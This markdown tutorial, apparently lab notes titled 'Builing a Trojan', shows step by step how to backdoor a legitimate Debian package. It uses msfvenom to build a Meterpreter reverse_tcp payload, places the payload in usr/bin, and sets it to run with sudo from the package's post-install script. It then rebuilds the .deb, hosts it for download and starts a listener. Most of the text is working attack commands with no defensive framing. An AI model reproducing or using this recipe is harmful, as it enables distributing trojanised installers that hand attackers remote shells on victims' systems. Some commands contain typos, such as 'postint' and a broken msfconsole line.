# Builing a Trojan

## Pre-requisutes

[Install metasploit framework](https://adamtheautomator.com/install-metasploit-on-ubuntu/)


## Optional setup
```bash
mkdir -p ~/Desktop/Malware/trojans && cd ~/Desktop/Malware/trojans
```

<br>

Choose an installer to modify and download it (kali - debian)
```bash
sudo apt download alpine
```
^ this downloads the alpine dpkg

<br>


## Extract the exe contents into a file

 <br>
 
Install engrampa archive manager
```bash
sudo apt update && sudo apt install engrampa -y
```

<br>

Extract .deb file contents
```bash
engrampa <filename> -e <folder_to_extract_into>
```  
Example
```bash
engrampa <filename> -e mailTrojan
```  

^ this requires a GUI – if not it will thrown an error.

<br>

View files
```bash
ls -hal mailTrojan
```
^ Along with the installation folder (“DEB”) you’ll have some folders (like “usr”) which will be copied to the relative home directories when installing the program. For example, upon installation, the “usr” folder (and it contents) will be copied to /home/usr. We will save our malicious file in usr/bin later.

<br>

## Creating/Implanting your malicious file

<br>

Create reverse payload shell using Msfvenom  

Format
```bash
msfvenom -a <architecture> -–platform <windows|linux> -p <payload> LHOST=<listening_host> LPORT=<listening_port> -b “\x00” -f <exe|elf> -o <exe_name>
```

<br>

Example
```bash
msfvenom -a x86 –-platform linux -p linux/x86/meterpreter/reverse_tcp LHOST=<kali_ip> LPORT=8443 -b “\x00” -f elf -o malicious
```

<br>

Copy your malicious file to the usr/bin
```bash
cp malicious usr/bin
```

<br>

__Troubleshooting: Creating a payload__  
If you have an encoding error – try explicitly specifying your encoder.  
See encoders with: `msfvenom –list encoders`  
Try using this one if you hit an error: `-e x86/mixed`  

 
Make sure the right arch/payload combination is selected…  
View payloads: `msfvenom –list payloads`  
View archs: `msfvenom --list archs`

<br>

## Editing your .DEB file

<br>

__mailTrojan/DEBIAN dir:__
- control: This file holds information about the package.
- md5sums: Used to verify file integrity after installation.
- preint: In Debian system – used tell installer what to do before installing. Create if it doesn’t exist (optional).
- postint: In Debian system – used tell installer what to do after installing. Create if it doesn’t exist.

<br>

Edit your postint file – make it a shell script to run the malicious payload
```bash
#!/bin/sh
sudo chmod 2755 /usr/bin/malicious &
sudo ./usr/bin/malicious &
exit 0
```
^ Point to the malicious file that you created earlier.

<br>

Make sure postint file is executable
```bash
chmod +x mailTrojan/DEBIAN/postint
```

<br>

## Compiling and listening

<br>

Compile your exe into a .deb file
```bash
dpkg-deb -–build <path_to_exe_files>
```

<br>

Example:
```bash
dpkg-deb -–build ~/Desktop/Malware/trojans/mailTrojan
```

<br>

Now you can host this file so someone can download.
```bash
python -m http.server 8080
```

<br>

Listening for incoming connections
```bash
msfconsole -q -x “use exploit/multi/handler; set PAYLOAD linux/x86/meterpreter/reverse_tcp; set LHOST <kali_ip>; set LPORT <kali_port; run; exit -y>
```

